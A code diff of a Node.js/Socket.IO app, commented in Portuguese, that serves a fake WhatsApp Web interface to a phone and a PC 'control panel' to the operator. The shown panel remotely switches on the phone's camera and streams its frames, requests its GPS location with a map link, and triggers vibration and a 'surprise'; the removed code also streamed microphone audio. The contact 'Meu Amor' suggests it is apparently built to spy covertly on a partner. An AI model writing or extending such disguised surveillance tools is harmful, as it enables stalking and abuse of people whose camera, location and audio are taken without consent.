-        .chat-info {
-            flex: 1;
-        }
-
-        .chat-name {
+        .user-name {
             color: #e9edef;
             font-weight: 500;
-            margin-bottom: 4px;
+            font-size: 16px;
         }
 
-        .chat-last-msg {
-            color: #8696a0;
-            font-size: 13px;
-        }
-
-        /* Main chat area */
+        /* Chat principal */
         .main-chat {
             flex: 1;
             display: flex;
@@ -880,32 +840,16 @@ app.get('/', (req, res) => {
 
         .chat-header {
             background: #202c33;
-            padding: 10px 16px;
+            padding: 12px 16px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             border-bottom: 1px solid #2a3942;
         }
 
-        .chat-contact {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .contact-avatar {
-            width: 40px;
-            height: 40px;
-            background: #2a3942;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-        }
-
-        .contact-name {
+        .contact-info h3 {
             color: #e9edef;
+            font-size: 16px;
             font-weight: 500;
         }
 
@@ -914,21 +858,13 @@ app.get('/', (req, res) => {
             font-size: 12px;
         }
 
-        .chat-actions {
-            display: flex;
-            gap: 20px;
-        }
-
-        /* Messages area */
-        .chat-messages {
+        .messages-area {
             flex: 1;
             overflow-y: auto;
             padding: 20px;
             display: flex;
             flex-direction: column;
             gap: 8px;
-            background-image: radial-gradient(circle at 25% 40%, rgba(255,255,255,0.02) 2%, transparent 2%);
-            background-size: 40px 40px;
         }
 
         .message {
@@ -937,8 +873,6 @@ app.get('/', (req, res) => {
             border-radius: 8px;
             font-size: 14px;
             line-height: 1.4;
-            position: relative;
-            word-wrap: break-word;
         }
 
         .message.sent {
@@ -962,8 +896,7 @@ app.get('/', (req, res) => {
             text-align: right;
         }
 
-        /* Input area */
-        .chat-input {
+        .input-area {
             background: #202c33;
             padding: 12px 16px;
             display: flex;
@@ -971,7 +904,18 @@ app.get('/', (req, res) => {
             align-items: center;
         }
 
-        .input-btn {
+        .input-field {
+            flex: 1;
+            background: #2a3942;
+            border: none;
+            padding: 10px 16px;
+            border-radius: 24px;
+            color: #e9edef;
+            font-size: 15px;
+            outline: none;
+        }
+
+        .send-btn {
             background: none;
             border: none;
             font-size: 24px;
@@ -979,20 +923,9 @@ app.get('/', (req, res) => {
             color: #8696a0;
         }
 
-        .chat-input input {
-            flex: 1;
-            background: #2a3942;
-            border: none;
-            padding: 10px 16px;
-            border-radius: 20px;
-            color: #e9edef;
-            font-size: 15px;
-            outline: none;
-        }
-
-        /* Control Panel - Painel do PC */
+        /* Painel de controle */
         .control-panel {
-            width: 320px;
+            width: 340px;
             background: #202c33;
             border-left: 1px solid #2a3942;
             display: flex;
@@ -1001,27 +934,22 @@ app.get('/', (req, res) => {
         }
 
         .panel-section {
-            padding: 16px;
+            padding: 20px;
             border-bottom: 1px solid #2a3942;
         }
 
         .panel-title {
             color: #e9edef;
-            font-size: 14px;
+            font-size: 16px;
             font-weight: 500;
-            margin-bottom: 12px;
+            margin-bottom: 16px;
             display: flex;
             align-items: center;
             gap: 8px;
         }
 
-        .control-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .ctrl-btn {
+        .btn-control {
+            width: 100%;
             background: #2a3942;
             border: none;
             padding: 12px;
@@ -1031,29 +959,34 @@ app.get('/', (req, res) => {
             cursor: pointer;
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
+            margin-bottom: 10px;
             transition: all 0.2s;
         }
 
-        .ctrl-btn:hover {
+        .btn-control:hover {
             background: #3b4a54;
+            transform: translateY(-1px);
         }
 
-        .ctrl-btn.active {
+        .btn-control:active {
+            transform: translateY(0);
+        }
+
+        .btn-danger {
+            background: #c0392b;
+        }
+
+        .btn-danger:hover {
+            background: #e74c3c;
+        }
+
+        .btn-success {
             background: #005c4b;
         }
 
-        .status-badge {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #8696a0;
-            margin-left: 8px;
-        }
-
-        .status-badge.online {
-            background: #25d366;
+        .btn-success:hover {
+            background: #006f5a;
         }
 
         .video-preview {
@@ -1063,9 +996,10 @@ app.get('/', (req, res) => {
             overflow: hidden;
         }
 
-        .video-preview img, .video-preview video {
+        .video-preview img {
             width: 100%;
             height: auto;
+            display: block;
         }
 
         .location-info {
@@ -1075,148 +1009,91 @@ app.get('/', (req, res) => {
             font-size: 12px;
             color: #8696a0;
             margin-top: 12px;
+            word-break: break-all;
         }
 
-        .music-list {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
+        .location-info a {
+            color: #25d366;
+            text-decoration: none;
         }
 
-        .music-item {
-            background: #2a3942;
-            padding: 10px;
-            border-radius: 8px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            transition: all 0.2s;
+        .status-badge {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #25d366;
+            margin-right: 6px;
+            animation: pulse 1.5s infinite;
         }
 
-        .music-item:hover {
-            background: #3b4a54;
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
 
-        /* Modal */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
+        .typing-badge {
+            color: #25d366;
+            font-size: 11px;
+            animation: blink 1s infinite;
         }
 
-        .modal-content {
-            background: #202c33;
-            border-radius: 12px;
-            max-width: 90%;
-            max-height: 90%;
-            overflow: auto;
-        }
-
-        .modal-content video {
-            width: 100%;
-            border-radius: 8px;
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
     </style>
 </head>
 <body>
-    <div class="whatsapp-web">
+    <div class="app">
         <!-- Sidebar -->
         <div class="sidebar">
             <div class="sidebar-header">
                 <div class="user-info">
-                    <div class="user-avatar">💻</div>
-                    <span class="user-name">PC - Controle</span>
-                </div>
-                <div class="sidebar-actions">
-                    <button class="action-btn">🔄</button>
-                    <button class="action-btn">💬</button>
-                    <button class="action-btn">⋮</button>
-                </div>
-            </div>
-            <div class="search-area">
-                <div class="search-box">
-                    <span>🔍</span>
-                    <input type="text" placeholder="Pesquisar ou começar uma nova conversa">
-                </div>
-            </div>
-            <div class="chat-list">
-                <div class="chat-item active">
-                    <div class="chat-avatar">💕</div>
-                    <div class="chat-info">
-                        <div class="chat-name">Meu Amor</div>
-                        <div class="chat-last-msg">Clique para conversar...</div>
+                    <div class="avatar">💻</div>
+                    <div>
+                        <div class="user-name">PC - Controle</div>
+                        <div style="color: #8696a0; font-size: 12px;">Conectado</div>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- Main Chat -->
+        <!-- Chat Principal -->
         <div class="main-chat">
             <div class="chat-header">
-                <div class="chat-contact">
-                    <div class="contact-avatar">💕</div>
-                    <div>
-                        <div class="contact-name">Meu Amor</div>
-                        <div class="contact-status" id="chatStatus">online</div>
+                <div>
+                    <h3 class="contact-name">Meu Amor 💕</h3>
+                    <div class="contact-status" id="contactStatus">
+                        <span class="status-badge"></span> online
                     </div>
-                </div>
-                <div class="chat-actions">
-                    <button class="action-btn">📞</button>
-                    <button class="action-btn">🎥</button>
-                    <button class="action-btn">⋮</button>
                 </div>
             </div>
 
-            <div class="chat-messages" id="chatMessages">
+            <div class="messages-area" id="messagesArea">
                 <div class="message received">
                     💕 Olá! Estou aqui para você 💕
                     <div class="message-meta">Agora</div>
                 </div>
             </div>
 
-            <div class="chat-input">
-                <button class="input-btn">😊</button>
-                <button class="input-btn">+</button>
-                <input type="text" id="messageInput" placeholder="Digite uma mensagem">
-                <button class="input-btn" id="sendBtn">📤</button>
+            <div class="input-area">
+                <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem">
+                <button class="send-btn" id="sendBtn">📤</button>
             </div>
         </div>
 
-        <!-- Control Panel -->
+        <!-- Painel de Controle -->
         <div class="control-panel">
             <div class="panel-section">
                 <div class="panel-title">
                     <span>📹</span> Controle de Câmera
                 </div>
-                <div class="control-buttons">
-                    <button class="ctrl-btn" id="toggleCameraBtn">
-                        <span>📷</span> Ativar Câmera
-                    </button>
-                    <div class="video-preview" id="videoPreview">
-                        <img id="remoteVideo" src="" alt="Preview">
-                    </div>
-                </div>
-            </div>
-
-            <div class="panel-section">
-                <div class="panel-title">
-                    <span>🎤</span> Áudio
-                </div>
-                <div class="control-buttons">
-                    <button class="ctrl-btn" id="toggleAudioBtn">
-                        <span>🔊</span> Ativar Microfone
-                    </button>
-                    <button class="ctrl-btn" id="testAudioBtn">
-                        <span>🎵</span> Testar Áudio
-                    </button>
+                <button class="btn-control" id="startCameraBtn">
+                    <span>📷</span> Ativar Câmera do Celular
+                </button>
+                <div class="video-preview">
+                    <img id="cameraPreview" src="" alt="Preview da câmera">
                 </div>
             </div>
 
@@ -1224,32 +1101,11 @@ app.get('/', (req, res) => {
                 <div class="panel-title">
                     <span>📍</span> Localização
                 </div>
-                <div class="control-buttons">
-                    <button class="ctrl-btn" id="getLocationBtn">
-                        <span>📍</span> Obter Localização
-                    </button>
-                    <div class="location-info" id="locationInfo">
-                        Aguardando localização...
-                    </div>
-                </div>
-            </div>
-
-            <div class="panel-section">
-                <div class="panel-title">
-                    <span>🎵</span> Música Romântica
-                </div>
-                <div class="music-list">
-                    <div class="music-item" data-video-id="1N8N-X8NM4k" data-name="Música Especial 1">
-                        <span>🎵</span> Música 1
-                    </div>
-                    <div class="music-item" data-video-id="sTVNvP5Uw98" data-name="Música Especial 2">
-                        <span>🎵</span> Música 2
-                    </div>
-                </div>
-                <div class="control-buttons" style="margin-top: 12px;">
-                    <button class="ctrl-btn" id="stopMusicBtn">
-                        <span>⏹️</span> Parar Música
-                    </button>
+                <button class="btn-control" id="getLocationBtn">
+                    <span>📍</span> Solicitar Localização
+                </button>
+                <div class="location-info" id="locationInfo">
+                    Aguardando localização...
                 </div>
             </div>
 
@@ -1257,294 +1113,154 @@ app.get('/', (req, res) => {
                 <div class="panel-title">
                     <span>💖</span> Ações Especiais
                 </div>
-                <div class="control-buttons">
-                    <button class="ctrl-btn" id="vibrateBtn">
-                        <span>📳</span> Vibrar
-                    </button>
-                    <button class="ctrl-btn" id="emergencyBtn">
-                        <span>💥</span> Surpresa Especial
-                    </button>
-                    <button class="ctrl-btn" id="swapCameraBtn">
-                        <span>🔄</span> Trocar Câmera
-                    </button>
+                <button class="btn-control" id="vibrateBtn">
+                    <span>📳</span> Vibrar Celular
+                </button>
+                <button class="btn-control btn-danger" id="emergencyBtn">
+                    <span>💥</span> Surpresa Especial
+                </button>
+            </div>
+
+            <div class="panel-section">
+                <div class="panel-title">
+                    <span>ℹ️</span> Status
+                </div>
+                <div style="background: #111b21; padding: 12px; border-radius: 8px;">
+                    <div style="color: #8696a0; font-size: 12px;">
+                        <div>🟢 Conectado ao celular</div>
+                        <div id="connectionStatus" style="margin-top: 5px;">Aguardando conexão...</div>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Modal -->
-    <div class="modal" id="cameraModal">
-        <div class="modal-content">
-            <video id="fullscreenVideo" autoplay playsinline style="width: 100%;"></video>
-            <button onclick="closeModal()" style="position: absolute; top: 10px; right: 10px; background: red; color: white; border: none; padding: 5px 10px; border-radius: 5px;">Fechar</button>
-        </div>
-    </div>
-
-    <script src="/socket.io/socket.io.js"></script>
+    <script src="${fullUrl}/socket.io/socket.io.js"></script>
     <script>
-        const socket = io('${fullUrl}');
-        
+        const socket = io('${fullUrl}', {
+            transports: ['websocket', 'polling'],
+            reconnection: true
+        });
+
         // Elementos
-        const chatMessages = document.getElementById('chatMessages');
+        const messagesArea = document.getElementById('messagesArea');
         const messageInput = document.getElementById('messageInput');
         const sendBtn = document.getElementById('sendBtn');
-        const remoteVideo = document.getElementById('remoteVideo');
+        const cameraPreview = document.getElementById('cameraPreview');
         const locationInfo = document.getElementById('locationInfo');
-        const chatStatus = document.getElementById('chatStatus');
-        
-        // Estado
+        const contactStatus = document.getElementById('contactStatus');
+        const connectionStatus = document.getElementById('connectionStatus');
+
         let typingTimeout = null;
-        let isTyping = false;
-        
-        // Função para adicionar mensagem
+
         function addMessage(text, type = 'sent') {
             const messageDiv = document.createElement('div');
             messageDiv.className = `message ${type}`;
-            
             const now = new Date();
             const timeStr = now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
-            
             messageDiv.innerHTML = \`
                 \${text}
                 <div class="message-meta">\${timeStr}</div>
             \`;
-            
-            chatMessages.appendChild(messageDiv);
-            chatMessages.scrollTop = chatMessages.scrollHeight;
-            return messageDiv;
+            messagesArea.appendChild(messageDiv);
+            messagesArea.scrollTop = messagesArea.scrollHeight;
         }
-        
-        // Enviar mensagem
+
         function sendMessage() {
             const text = messageInput.value.trim();
             if (text) {
                 addMessage(text, 'sent');
-                socket.emit('chat_message', text);
+                socket.emit('send_message', { text, timestamp: Date.now() });
                 messageInput.value = '';
-                stopTyping();
             }
         }
-        
-        // Indicador de digitação
+
         function startTyping() {
-            if (!isTyping) {
-                isTyping = true;
-                socket.emit('typing_start');
-                chatStatus.innerHTML = 'digitando...';
-            }
+            socket.emit('typing_start');
             if (typingTimeout) clearTimeout(typingTimeout);
-            typingTimeout = setTimeout(() => {
-                stopTyping();
-            }, 1000);
+            typingTimeout = setTimeout(() => socket.emit('typing_stop'), 1000);
         }
-        
-        function stopTyping() {
-            if (isTyping) {
-                isTyping = false;
-                socket.emit('typing_stop');
-                chatStatus.innerHTML = 'online';
-            }
-        }
-        
+
         // Eventos de input
         sendBtn.addEventListener('click', sendMessage);
-        messageInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') sendMessage();
-        });
+        messageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
         messageInput.addEventListener('input', startTyping);
-        
-        // Controles de câmera
-        let frameCount = 0;
-        socket.on('frame', (frameData) => {
-            remoteVideo.src = frameData;
-            frameCount++;
-        });
-        
-        document.getElementById('toggleCameraBtn').addEventListener('click', () => {
-            socket.emit('comando', 'toggleCamera');
+
+        // Controles
+        document.getElementById('startCameraBtn').addEventListener('click', () => {
+            socket.emit('command', { type: 'start_camera' });
             addMessage('📷 Solicitando ativação da câmera...', 'sent');
         });
-        
-        document.getElementById('swapCameraBtn').addEventListener('click', () => {
-            socket.emit('comando', 'trocarCamera');
-            addMessage('🔄 Trocando câmera...', 'sent');
-        });
-        
-        // Áudio
-        let audioEnabled = true;
-        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        const audioGain = audioContext.createGain();
-        audioGain.gain.value = 0.5;
-        audioGain.connect(audioContext.destination);
-        
-        socket.on('audio', (audioData) => {
-            if (audioEnabled) {
-                const buffer = audioContext.createBuffer(1, audioData.length, audioContext.sampleRate);
-                buffer.copyToChannel(new Float32Array(audioData), 0);
-                const source = audioContext.createBufferSource();
-                source.buffer = buffer;
-                source.connect(audioGain);
-                source.start();
-            }
-        });
-        
-        socket.on('audio_message', (audioBase64) => {
-            addMessage('🎤 Mensagem de áudio recebida', 'received');
-        });
-        
-        document.getElementById('toggleAudioBtn').addEventListener('click', () => {
-            audioEnabled = !audioEnabled;
-            const btn = document.getElementById('toggleAudioBtn');
-            btn.innerHTML = audioEnabled ? '<span>🔊</span> Microfone ON' : '<span>🔇</span> Microfone OFF';
-            addMessage(audioEnabled ? '🎤 Áudio ativado' : '🔇 Áudio desativado', 'sent');
-        });
-        
-        document.getElementById('testAudioBtn').addEventListener('click', () => {
-            socket.emit('comando', 'testAudio');
-            addMessage('🎵 Testando áudio do celular...', 'sent');
-        });
-        
-        // Localização
-        socket.on('location', (data) => {
-            locationInfo.innerHTML = \`
-                📍 Localização atual:<br>
-                Lat: \${data.latitude.toFixed(6)}<br>
-                Lng: \${data.longitude.toFixed(6)}<br>
-                <a href="https://www.google.com/maps?q=\${data.latitude},\${data.longitude}" target="_blank" style="color: #25d366;">
-                    🗺️ Ver no mapa
-                </a>
-            \`;
-            addMessage(\`📍 Localização recebida: \${data.latitude.toFixed(4)}, \${data.longitude.toFixed(4)}\`, 'received');
-        });
-        
+
         document.getElementById('getLocationBtn').addEventListener('click', () => {
-            socket.emit('comando', 'getLocation');
+            socket.emit('command', { type: 'get_location' });
             addMessage('📍 Solicitando localização...', 'sent');
         });
-        
-        // Música
-        document.querySelectorAll('.music-item').forEach(item => {
-            item.addEventListener('click', () => {
-                const videoId = item.getAttribute('data-video-id');
-                const songName = item.getAttribute('data-name');
-                socket.emit('play_youtube', { videoId, songName });
-                addMessage(\`🎵 Tocando: \${songName}\`, 'sent');
-            });
-        });
-        
-        document.getElementById('stopMusicBtn').addEventListener('click', () => {
-            socket.emit('stop_music');
-            addMessage('⏹️ Música parada', 'sent');
-        });
-        
-        // Ações especiais
+
         document.getElementById('vibrateBtn').addEventListener('click', () => {
-            socket.emit('comando', 'vibrate');
+            socket.emit('command', { type: 'vibrate' });
             addMessage('📳 Vibração enviada', 'sent');
         });
-        
+
         document.getElementById('emergencyBtn').addEventListener('click', () => {
-            socket.emit('comando', 'emergency');
-            addMessage('💥 Surpresa especial enviada! 💥', 'sent');
+            socket.emit('command', { type: 'emergency' });
+            addMessage('💥 Surpresa especial enviada!', 'sent');
         });
-        
-        // Receber mensagens do celular
-        socket.on('chat_message', (msg) => {
-            addMessage(msg, 'received');
+
+        // Receber dados
+        socket.on('new_message', (data) => {
+            addMessage(data.text, 'received');
         });
-        
-        socket.on('typing_start', () => {
-            chatStatus.innerHTML = 'digitando...';
+
+        socket.on('new_audio', (data) => {
+            addMessage('🎤 Mensagem de áudio recebida', 'received');
         });
-        
-        socket.on('typing_stop', () => {
-            chatStatus.innerHTML = 'online';
+
+        socket.on('camera_stream', (frameData) => {
+            cameraPreview.src = frameData;
         });
-        
+
+        socket.on('new_location', (location) => {
+            locationInfo.innerHTML = \`
+                📍 Localização do celular:<br>
+                Latitude: \${location.lat.toFixed(6)}<br>
+                Longitude: \${location.lng.toFixed(6)}<br>
+                <a href="https://www.google.com/maps?q=\${location.lat},\${location.lng}" target="_blank">
+                    🗺️ Abrir no Google Maps
+                </a>
+            \`;
+            addMessage(\`📍 Localização recebida: \${location.lat.toFixed(4)}, \${location.lng.toFixed(4)}\`, 'received');
+        });
+
+        socket.on('user_typing', (data) => {
+            if (data.isTyping) {
+                contactStatus.innerHTML = '<span class="typing-badge">✍️</span> digitando...';
+            } else {
+                contactStatus.innerHTML = '<span class="status-badge"></span> online';
+            }
+        });
+
+        socket.on('peer_status', (status) => {
+            if (status.status === 'online') {
+                contactStatus.innerHTML = '<span class="status-badge"></span> online';
+                connectionStatus.innerHTML = '✅ Celular conectado';
+            }
+        });
+
+        socket.on('peer_disconnected', () => {
+            contactStatus.innerHTML = '<span style="color: #8696a0;">●</span> offline';
+            connectionStatus.innerHTML = '⚠️ Celular desconectado';
+        });
+
         socket.on('connect', () => {
-            addMessage('✨ Conectado ao WhatsApp do seu amor! ✨', 'received');
+            addMessage('✨ Conectado ao celular!', 'received');
+            connectionStatus.innerHTML = '✅ Conectado ao servidor';
         });
-        
-        // Função para fechar modal
-        window.closeModal = function() {
-            document.getElementById('cameraModal').style.display = 'none';
-        };
+
+        socket.on('disconnect', () => {
+            connectionStatus.innerHTML = '❌ Desconectado do servidor';
+        });
     </script>
 </body>
-</html>`);
-  }
-});
-
-// Socket.IO lógica principal
-io.on('connection', (socket) => {
-  console.log('Cliente conectado:', socket.id);
-  
-  // Mensagens de chat
-  socket.on('chat_message', (msg) => {
-    console.log('Mensagem:', msg);
-    socket.broadcast.emit('chat_message', msg);
-  });
-  
-  socket.on('audio_message', (audioData) => {
-    socket.broadcast.emit('audio_message', audioData);
-  });
-  
-  // Indicador de digitação
-  socket.on('typing_start', () => {
-    socket.broadcast.emit('typing_start');
-  });
-  
-  socket.on('typing_stop', () => {
-    socket.broadcast.emit('typing_stop');
-  });
-  
-  // Músicas do YouTube
-  socket.on('play_youtube', (data) => {
-    console.log('Tocando música:', data.songName);
-    socket.broadcast.emit('play_youtube', data);
-  });
-  
-  socket.on('stop_music', () => {
-    socket.broadcast.emit('stop_music');
-  });
-  
-  // Streaming de mídia
-  socket.on('frame', (frameData) => {
-    socket.broadcast.emit('frame', frameData);
-  });
-  
-  socket.on('audio', (audioData) => {
-    socket.broadcast.emit('audio', audioData);
-  });
-  
-  // Comandos
-  socket.on('comando', (cmd) => {
-    console.log('Comando:', cmd);
-    socket.broadcast.emit('comando', cmd);
-  });
-  
-  // Localização
-  socket.on('location', (loc) => {
-    socket.broadcast.emit('location', loc);
-  });
-  
-  socket.on('disconnect', () => {
-    console.log('Cliente desconectado:', socket.id);
-  });
-});
-
-server.listen(PORT, '0.0.0.0', () => {
-  console.log(`\n✨ WhatsApp Clone com Controle Remoto! ✨`);
-  console.log(`   Porta: ${PORT}`);
-  console.log(`   Acesse no PC e no Celular na mesma rede`);
-  console.log(`\n📱 No CELULAR: Interface 100% WhatsApp`);
-  console.log(`💻 No PC: Painel de controle completo`);
-  console.log(`\nFuncionalidades:`);
-  console.log(`   💬 Chat igual ao WhatsApp`);
-  console.log(`   📷 Controle de câmera`);
-  console.log(`   🎤 Controle de áudio`);
-  console.log(`   📍 Localização em tempo real`);
-  console.log(`   🎵 Músicas em segundo plano`);
-  console.log(`   📳 Vibração e surpresas`);
-  console.log(`\n💕 Acesse: http://localhost:${PORT}\n`);
-});
+</html>`;
+}
